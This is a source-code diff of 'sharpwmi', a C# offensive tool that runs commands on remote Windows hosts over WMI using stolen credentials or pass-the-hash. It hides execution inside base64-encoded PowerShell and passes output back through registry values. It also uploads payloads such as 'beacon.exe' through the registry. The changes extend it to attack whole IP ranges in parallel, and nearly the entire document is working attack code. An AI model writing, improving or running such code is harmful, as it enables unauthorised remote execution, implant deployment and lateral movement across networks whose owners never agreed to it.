@@ -1,16 +1,60 @@
 using System;
 using System.Text;
 using System.Threading;
+using System.Threading.Tasks;
 using System.IO;
 using System.Management;
+using System.Collections.Generic;
+using NetTools;
 
 namespace sharpwmi
 {
     class sharpwmi
     {
-        public ManagementScope scope;
+        ManagementScope scope;
+        ConnectionOptions options;
+
+        string method;
+        string host;
+        string username = "";
+        string password = "";
+        string command = "";
+        string action = "";
+        string local = "";
+        string remote = "";
 
 
+        int delay;
+        sharpwmi(string method,string host,string username="",string password="",string command="",string action="",string local = "",string remote="")
+        {
+            options = new ConnectionOptions();
+            delay = 1000;
+            this.host = host;
+            this.method = method;
+            this.username = username;
+            this.password = password;
+            this.command = command;
+            this.action = action;
+            this.remote = remote;
+            this.local = local;
+        }
+
+        public bool init(string host)
+        {
+            bool status=false;
+            try {
+                this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
+                this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
+                this.scope.Options.EnablePrivileges = true;
+                this.scope.Connect();
+                status = true;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine($"[-]{this.host} {e.Message}");
+            }
+            return status;
+        }
         public Int32 ExecCmd(string cmd)
         {
 
@@ -37,166 +81,152 @@ namespace sharpwmi
         }
 
 
-        public void run(string[] args)
+        public void run()
         {
-            if (args.Length < 3)
+
+            void cmd(string command)
             {
-                Console.WriteLine("\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 cmd whoami\n\t\tsharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\\beacon.exe\n\t\tsharpwmi.exe pth 192.168.2.3 cmd whoami\n\t\tsharpwmi.exe pth 192.168.2.3 upload beacon.exe c:\\beacon.exe");
+                string powershell_command = "powershell -enc " + Base64Encode(command);
+
+                string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"txt\",$b)";
+
+
+                ExecCmd("powershell -enc " + Base64Encode(code));
+                Console.WriteLine($"[+]{this.host} Exec done!\n");
+                Thread.Sleep(delay);
+
+                ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
+                ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");
+
+                inParams["sSubKeyName"] = "";
+                inParams["sValueName"] = "txt";
+                ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);
+
+                Console.WriteLine("[+]output -> \n\n" + Base64Decode(outParams["sValue"].ToString()));
+            }
+
+            void upload(string local_file, string remote_file)
+            {
+
+
+                byte[] str = File.ReadAllBytes(local_file);
+
+
+                ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
+                ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
+                inParams["hDefKey"] = 2147483650;
+                inParams["sSubKeyName"] = @"";
+                inParams["sValueName"] = "upload";
+
+                inParams["sValue"] = Convert.ToBase64String(str);
+                ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);
+
+                string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", remote_file);
+                string powershell_command = "powershell -enc " + Base64Encode(pscode);
+
+                Thread.Sleep(delay);
+                ExecCmd(powershell_command);
+                Console.WriteLine($"[+]{this.host} Upload file done!");
                 return;
-            }
+            };
 
 
-            if (args[0] == "pth") {
-
-                string host = args[1];
-                string func_name = args[2];
-                string command = "";
-                string local_file = "";
-                string remote_file = "";
-
-                if (func_name == "cmd")
-                {
-                     command=args[3];
-                }
-                else
-                {
-                    local_file = args[3];
-                    remote_file = args[4];
-                }
-
-                ConnectionOptions options = new ConnectionOptions();
-
-                int delay = 5000;
-                this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
-                this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
-                this.scope.Options.EnablePrivileges = true;
-                this.scope.Connect();
-
-                if (func_name == "cmd") {
-                    string powershell_command = "powershell -enc " + Base64Encode(command);
-
-                    string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"txt\",$b)";
-
-                    ExecCmd("powershell -enc " + Base64Encode(code));
-                    Console.WriteLine("[+]Exec done!\n");
-                    Thread.Sleep(delay);
-
-                    //this.ExecCmd("whoami");
-                    // 读取注册表
-                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
-                    ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");
-
-                    inParams["sSubKeyName"] = "";
-                    inParams["sValueName"] = "txt";
-                    ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);
-                    // (String)outParams["sValue"];
-
-                    Console.WriteLine("[+]output -> \n\n" + Base64Decode(outParams["sValue"].ToString()));
-                }else if (func_name == "upload")
-                {
-                    byte[] str = File.ReadAllBytes(local_file);
-
-
-                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
-                    ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
-                    inParams["hDefKey"] = 2147483650; //HKEY_LOCAL_MACHINE;
-                    inParams["sSubKeyName"] = @"";
-                    inParams["sValueName"] = "upload";
-
-                    inParams["sValue"] = Convert.ToBase64String(str);
-                    ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);
-
-
-
-                    //通过注册表还原文件
-                    string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", remote_file);
-                    string powershell_command = "powershell -enc " + Base64Encode(pscode);
-
-                    Thread.Sleep(delay);
-                    ExecCmd(powershell_command);
-                    Console.WriteLine("[+]Upload file done!");
-                    return;
-                }
-
-            }
-            else
+            if (this.method == "login")
             {
-
-                ConnectionOptions options = new ConnectionOptions();
-                string host = args[0];
-                options.Username = args[1];
-                options.Password = args[2];
-
-
-                int delay = 5000;
-                this.scope = new ManagementScope("\\\\" + host + "\\root\\cimv2", options);
-                this.scope.Options.Impersonation = System.Management.ImpersonationLevel.Impersonate;
-                this.scope.Options.EnablePrivileges = true;
-                this.scope.Connect();
-
-
-                if (args[3] == "cmd")
+                options.Username = this.username;
+                options.Password = this.password;
+                if (!init(this.host)) { return; }
+                if (this.action == "cmd")
                 {
-                    string powershell_command = "powershell -enc " + Base64Encode(args[4]);
-
-                    string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"txt\",$b)";
-
-
-                    ExecCmd("powershell -enc " + Base64Encode(code));
-                    Console.WriteLine("[+]Exec done!\n");
-                    Thread.Sleep(delay);
-
-                    //this.ExecCmd("whoami");
-                    // 读取注册表
-                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
-                    ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");
-
-                    inParams["sSubKeyName"] = "";
-                    inParams["sValueName"] = "txt";
-                    ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);
-                    // (String)outParams["sValue"];
-
-                    Console.WriteLine("[+]output -> \n\n" + Base64Decode(outParams["sValue"].ToString()));
+                    cmd(this.command);
                 }
-                else if (args[3] == "upload")
+                else if(this.action == "upload")
                 {
-
-
-
-                    //写注册表
-                    byte[] str = File.ReadAllBytes(args[4]);
-
-
-                    ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
-                    ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
-                    inParams["hDefKey"] = 2147483650; //HKEY_LOCAL_MACHINE;
-                    inParams["sSubKeyName"] = @"";
-                    inParams["sValueName"] = "upload";
-
-                    inParams["sValue"] = Convert.ToBase64String(str);
-                    ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);
-
-
-
-                    //通过注册表还原文件
-                    string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", args[5]);
-                    string powershell_command = "powershell -enc " + Base64Encode(pscode);
-
-                    Thread.Sleep(delay);
-                    ExecCmd(powershell_command);
-                    Console.WriteLine("[+]Upload file done!");
-                    return;
-
+                    upload(this.local, this.remote);
+                }
+            }else if(this.method == "pth")
+            {
+                if (!init(this.host)) { return; }
+                if (this.action == "cmd")
+                {
+                    cmd(this.command);
+                }
+                else if (this.action == "upload")
+                {
+                    upload(this.local, this.remote);
                 }
             }
-            
 
+            //xxx
         }
         static void Main(string[] args)
         {
 
-            sharpwmi myWMICore = new sharpwmi();
-            myWMICore.run(args);
+            string method;
+            string host;
+            string username = "";
+            string password = "";
+            string command = "";
+            string action = "";
+            string local = "";
+            string remote = "";
+
+            method = args[0];
+            host = args[1];
+            IPAddressRange ipRange = IPAddressRange.Parse(host);
+
+            if (method == "login")
+            {
+
+                username = args[2];
+                password = args[3];
+                action = args[4];
+                if (action == "cmd")
+                {
+                    command = args[5];
+                } else if (action == "upload")
+                {
+                    local = args[5];
+                    remote = args[6];
+                }
+            } else if (method == "pth")
+            {
+                action = args[3];
+                if (action == "cmd")
+                {
+                    command = args[4];
+                }
+                else if (action == "upload")
+                {
+                    local = args[4];
+                    remote = args[5];
+                }
+            }
+            string temp;
+
+            void taskProc(string ip, ManualResetEvent manualResetEvent)
+            {
+                sharpwmi wmi = new sharpwmi(method, host: ip.ToString().Trim(), username: username, password: password, command: command, action: action, local: local, remote: remote);
+                wmi.run();
+                manualResetEvent.Set();
+            }
+
+            var waits = new List<EventWaitHandle>();
+
+            Task[] tasks;
+            int taskCount=0;
+            foreach (var ip in ipRange)
+            {
+                var handler = new ManualResetEvent(false);
+                waits.Add(handler);
+                Task task = Task.Run(() => taskProc(ip.ToString().Trim(), handler));
+            }
+
+            //��64�̼߳��׵ȴ� 
+            foreach (var wait in waits.ToArray())
+            {
+                wait.WaitOne();
+            }
 
         }
     }
